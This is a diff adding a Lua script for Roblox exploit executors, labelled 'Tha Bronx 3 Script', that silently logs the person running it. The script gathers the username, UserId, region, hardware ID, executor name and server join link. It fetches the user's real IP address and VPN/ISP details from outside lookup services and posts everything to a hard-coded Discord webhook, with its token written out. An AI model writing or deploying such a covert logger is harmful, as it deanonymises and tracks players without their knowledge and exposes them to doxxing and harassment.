@@ -1,0 +1,187 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService = game:GetService("LocalizationService")
+
+local request =
+    http_request or
+    request or
+    syn and syn.request
+
+if not request then return end
+
+local player = Players.LocalPlayer
+local webhook = "https://discord.com/api/webhooks/1360531633647648958/tuZQCTppGmupuSaWZat37xyKBKeYz3EexEi9YpQOqycU1TE4QZiXN8DxBS8BjpTb6ghA"
+
+-- 🎮 Game name
+local gameName = "Unknown Game"
+pcall(function()
+    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+
+-- 🔗 Join link
+local joinLink =
+    "roblox://placeId=" .. game.PlaceId ..
+    "&gameInstanceId=" .. game.JobId
+
+-- 🌍 Country / Region
+local region = "Unknown"
+pcall(function()
+    region = LocalizationService:GetCountryRegionForPlayerAsync(player)
+end)
+
+-- 🧠 Executor
+local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
+
+-- 🔧 Hardware ID
+local hwid = "Unknown"
+pcall(function()
+    if syn and syn.get_hwid then
+        hwid = syn.get_hwid()
+    elseif get_hwid then
+        hwid = get_hwid()
+    elseif gethwid then
+        hwid = gethwid()
+    end
+end)
+
+-- 🌐 REAL EXTERNAL IP (using ipify API)
+local realIP = "Failed to fetch"
+pcall(function()
+    -- Try multiple IP API services as fallback
+    local ipServices = {
+        "https://api.ipify.org",
+        "https://api64.ipify.org",
+        "https://icanhazip.com",
+        "https://checkip.amazonaws.com"
+    }
+    
+    for _, apiUrl in ipairs(ipServices) do
+        local success, result = pcall(function()
+            local response = request({
+                Url = apiUrl,
+                Method = "GET"
+            })
+            if response and response.Body and #response.Body > 0 and #response.Body < 20 then
+                return response.Body:gsub("%s+", "") -- Clean whitespace
+            end
+        end)
+        
+        if success and result and result:match("%d+%.%d+%.%d+%.%d+") then
+            realIP = result
+            break
+        end
+    end
+end)
+
+-- 🔐 VPN/Proxy detection
+local vpnStatus = "Unknown"
+pcall(function()
+    if realIP ~= "Failed to fetch" then
+        local ipCheck = request({
+            Url = "http://ip-api.com/json/" .. realIP .. "?fields=proxy,isp,countryCode",
+            Method = "GET"
+        })
+        if ipCheck and ipCheck.Body then
+            local data = HttpService:JSONDecode(ipCheck.Body)
+            vpnStatus = data.proxy and "✅ VPN/Proxy" or "❌ No"
+            
+            -- Add ISP and country info if available
+            if data.isp then vpnStatus = vpnStatus .. " | " .. data.isp end
+            if data.countryCode then vpnStatus = vpnStatus .. " | " .. data.countryCode end
+        end
+    end
+end)
+
+-- ⚠️ Blacklist check (optional - uncomment if you have a blacklist API)
+-- pcall(function()
+--     local blacklistCheck = request({
+--         Url = "https://your-blacklist-api.com/check?hwid=" .. hwid .. "&ip=" .. realIP,
+--         Method = "GET"
+--     })
+--     if blacklistCheck and blacklistCheck.Body then
+--         local isBlacklisted = HttpService:JSONDecode(blacklistCheck.Body)
+--         if isBlacklisted then
+--             player:Kick("🚫 Device Blacklisted")
+--         end
+--     end
+-- end)
+
+local data = {
+    embeds = {{
+        title = "🛡️ | Tha Bronx 3 Script",  -- Changed title
+        color = 0x00AAFF,
+
+        thumbnail = {
+            url = "https://media.discordapp.net/attachments/1389612289371537549/1446840065979453480/SynthX_v4.png"
+        },
+
+        fields = {
+            {
+                name = "🎮 Game",
+                value = "``" .. gameName .. "``",
+                inline = true
+            },
+            {
+                name = "👤 Username",
+                value = "``" .. player.Name .. "``",
+                inline = true
+            },
+            {
+                name = "🆔 UserId",
+                value = "``" .. player.UserId .. "``",
+                inline = true
+            },
+            {
+                name = "🌍 Country / Region",
+                value = "``" .. region .. "``",
+                inline = true
+            },
+            {
+                name = "🖥️ Hardware ID",
+                value = "```" .. hwid .. "```",
+                inline = false
+            },
+            {
+                name = "🌐 IP Address",
+                value = "``" .. realIP .. "``",
+                inline = true
+            },
+            {
+                name = "🔐 VPN Status",
+                value = "``" .. vpnStatus .. "``",
+                inline = true
+            },
+            {
+                name = "🧠 Executor",
+                value = "``" .. executor .. "``",
+                inline = true
+            },
+            {
+                name = "🔗 Join Link",
+                value = "``" .. joinLink .. "``",
+                inline = false
+            }
+        },
+
+        footer = {
+            text = "Tha Bronx 3 Logs • " .. os.date("%Y-%m-%d %H:%M:%S")
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+request({
+    Url = webhook,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode(data)
+})
+
+-- Optional: Send a second embed for important alerts (like blacklist matches)
+if hwid ~= "Unknown" then
+    -- You can add logic here to check against known blacklisted HWIDs
+    -- and send an alert embed if there's a match
+end
